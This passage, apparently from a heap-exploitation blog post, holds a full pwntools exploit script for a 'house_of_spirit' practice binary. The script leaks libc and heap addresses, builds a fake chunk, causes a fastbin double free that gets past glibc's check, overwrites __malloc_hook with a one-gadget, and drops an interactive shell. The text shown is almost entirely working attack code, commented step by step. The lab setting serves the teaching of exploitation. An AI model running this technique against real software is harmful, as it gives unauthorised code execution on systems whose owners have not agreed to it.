+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./house_of_spirit&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;../.glibc/glibc_2.30_no-tcache/libc.so.6&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>b *main
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+270
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+327
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+415
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+541
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+652
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+707
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+792
+</span></span></span><span class=line><span class=cl><span class=s2>b *main+873
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>index</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>info</span><span class=p>(</span><span class=n>mes</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>mes</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>handle</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>puts</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>heap</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;puts() @ &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>puts</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;heap @ &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>heap</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s1>&#39;puts @ &#39;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>puts</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>info</span><span class=p>(</span><span class=s2>&#34;heap @ &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>heap</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>puts</span><span class=p>,</span> <span class=n>heap</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>info_user</span><span class=p>(</span><span class=n>age</span><span class=p>,</span> <span class=n>name</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Enter your age: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>age</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Enter your username: &#39;</span><span class=p>,</span> <span class=n>name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>data</span><span class=p>,</span> <span class=n>chunk_name</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>index</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;size: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;data: &#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;chunk name: &#39;</span><span class=p>,</span> <span class=n>chunk_name</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>index</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>index</span> <span class=o>-</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>target</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>quit</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;LD_PRELOAD&#34;</span><span class=p>:</span> <span class=n>libc</span><span class=o>.</span><span class=n>path</span><span class=p>},</span><span class=n>gdbscript</span><span class=o>=</span><span class=n>gs</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>puts</span><span class=p>,</span> <span class=n>heap</span> <span class=o>=</span> <span class=n>handle</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>puts</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;libc base: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>timeout</span> <span class=o>=</span> <span class=mf>0.1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#=====================================================================================</span>
+</span></span><span class=line><span class=cl><span class=c1># Ignore the &#34;age&#34; field.</span>
+</span></span><span class=line><span class=cl><span class=n>age</span> <span class=o>=</span> <span class=mh>0x71</span>
+</span></span><span class=line><span class=cl><span class=c1># Ignore the &#34;username&#34; field.</span>
+</span></span><span class=line><span class=cl><span class=n>username</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x1234</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>info_user</span><span class=p>(</span><span class=n>age</span><span class=p>,</span> <span class=n>username</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Request two chunks with any size (chunks A &amp; C) and one chunk with size 0x70.</span>
+</span></span><span class=line><span class=cl><span class=c1># The most-significant byte of the _IO_wide_data_0 vtable pointer (0x7f) is used later as a size field.</span>
+</span></span><span class=line><span class=cl><span class=c1># Overflow pointers to chunk_A &amp; chunk_C with the address of our fake chunk.</span>
+</span></span><span class=line><span class=cl><span class=c1># Chunk_B is used to bypass the fastbins double-free mitigation.</span>
+</span></span><span class=line><span class=cl><span class=n>chunk_A</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x18</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>chunk_B</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;B&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;B&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>chunk_C</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x18</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;C&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;C&#34;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Coerce a double-free by freeing chunk_A, then chunk_B, then chunk_C.</span>
+</span></span><span class=line><span class=cl><span class=c1># This way the fake chunk is not at the head of the 0x70 fastbin when it is freed for the second time,</span>
+</span></span><span class=line><span class=cl><span class=c1># bypassing the fastbins double-free mitigation.</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_A</span><span class=p>)</span> <span class=c1># Frees the fake chunk.</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_B</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_C</span><span class=p>)</span> <span class=c1># Double-frees the fake chunk.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># The next request for a 0x70-sized chunk will be serviced by the fake chunk.</span>
+</span></span><span class=line><span class=cl><span class=c1># Request it, then overwrite its fastbin fd, pointing it near the the malloc hook,</span>
+</span></span><span class=line><span class=cl><span class=c1># specifically where the 0x7f byte of the _IO_wide_data_0 vtable pointer will form the</span>
+</span></span><span class=line><span class=cl><span class=c1># least-significant byte of a size field.</span>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x23</span><span class=p>),</span> <span class=sa>b</span><span class=s2>&#34;D&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Make two more requests for 0x70-sized chunks. The fake chunk, then chunk_B are allocated to</span>
+</span></span><span class=line><span class=cl><span class=c1># service these requests.</span>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;E&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;E&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;F&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;F&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># The next request for a 0x70-sized chunk is serviced by the fake chunk near the malloc hook.</span>
+</span></span><span class=line><span class=cl><span class=c1># Use it to overwrite the malloc hook with the address of a one-gadget.</span>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;X&#34;</span><span class=o>*</span><span class=mh>0x13</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>+</span> <span class=mh>0xe1fa1</span><span class=p>),</span> <span class=sa>b</span><span class=s2>&#34;G&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span> <span class=c1># [rsp+0x50] == NULL</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># The next call to malloc() will instead call the one-gadget and drop a shell.</span>
+</span></span><span class=line><span class=cl><span class=c1># The argument to malloc() is irrelevant, as long as it passes the program&#39;s size check.</span>
+</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># =============================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/pwnable/>Pwnable</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section><section class=article-lastmod><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<span>Last updated on Jun 15, 2024 00:00 UTC</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/the-house-of-rabbit/><div class=article-image><img src=/p/the-house-of-rabbit/cover.364131cb46a6f21fe9e9c0f541615683_hu9d8857c717d96ad2f86768a20d874436_10244_250x150_fill_q75_box_smart1.jpg width=250 height=150 loading=lazy alt="Featured image of post The House of Rabbit" data-hash="md5-NkExy0am8h/p6cD1QWFWgw=="></div><div class=article-details><h2 class=article-title>The House of Rabbit</h2></div></a></article><article class=has-image><a href=/p/welcome-to-linux-heap-exploitation-~-part-1/><div class=article-image><img src=/p/welcome-to-linux-heap-exploitation-~-part-1/cover.977c8f02cef13103bc9478822a0c6c0f_hu1baf41c855c051bc94a2dd717dae5de0_73444_250x150_fill_q75_box_smart1.jpg width=250 height=150 loading=lazy alt="Featured image of post Linux Heap Exploitation - Part 1" data-key="Welcome to Linux Heap Exploitation ~ Part 1" data-hash="md5-l3yPAs7xMQO8lHiCKgxsDw=="></div><div class=article-details><h2 class=article-title>Linux Heap Exploitation - Part 1</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//Blog's Broder.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2024 Blog's Broder</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.26.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
